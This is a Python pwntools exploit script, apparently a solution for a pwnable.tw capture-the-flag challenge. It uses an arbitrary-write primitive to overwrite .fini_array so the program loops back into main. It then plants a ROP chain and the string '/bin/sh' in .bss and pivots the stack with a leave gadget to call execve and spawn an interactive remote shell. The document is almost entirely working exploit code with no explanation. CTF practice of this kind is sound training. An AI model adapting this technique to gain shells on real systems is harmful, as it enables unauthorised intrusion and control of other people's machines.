from pwn import *

host = 'chall.pwnable.tw'
port = 10105

def put_rop(base, chain):
	cidx = 0

	for i in range(len(chain) // 3):
		p.recvuntil(b'addr:')
		payload = str(base + 8 * cidx).encode()
		p.sendline(payload)

		p.recvuntil(b'data')
		payload = chain[cidx] + chain[cidx + 1] + chain[cidx + 2]
		p.send(payload)
		cidx += 3

	p.recvuntil(b'addr:')
	payload = str(base + 8 * cidx).encode()
	p.sendline(payload)

	p.recvuntil(b'data')
	payload = chain[cidx]
	p.send(payload)

p = remote(host, port)

# destructors-fn ==> fini_wrapper (caller) | main-destructor ==> main 

new_stack = 0x4b4100
fini_array = 0x4b40f0
main = 0x401b6d
fini_wrapper = 0x402960

# gadgets

pop_rax = 0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
pop_rsp = 0x0000000000402ba9
scall = 0x48705b
leave = 0x000000000048a281

# args

execve = 59
argv = envp = 0
bin_sh = b'/bin/sh\x00'
bin_sh_addr = new_stack + 9 * 8

# make endless restart

payload = str(fini_array).encode()
p.recvuntil(b'addr:')
p.sendline(payload)

payload = p64(fini_wrapper) + p64(main)
p.recvuntil(b'data:')
p.sendline(payload)

# put rop to .data/.bss

rop = [
		p64(pop_rax), p64(execve), \
		p64(pop_rdi), p64(bin_sh_addr), \
		p64(pop_rsi), p64(argv), \
		p64(pop_rdx), p64(envp), \
		p64(scall), bin_sh
	]

put_rop(new_stack, rop)

# pivot stack & call execve

payload = str(fini_array).encode()
p.recvuntil(b'addr:')
p.sendline(payload)

payload = p64(leave)
p.recvuntil(b'data:')
p.send(payload)

p.interactive()
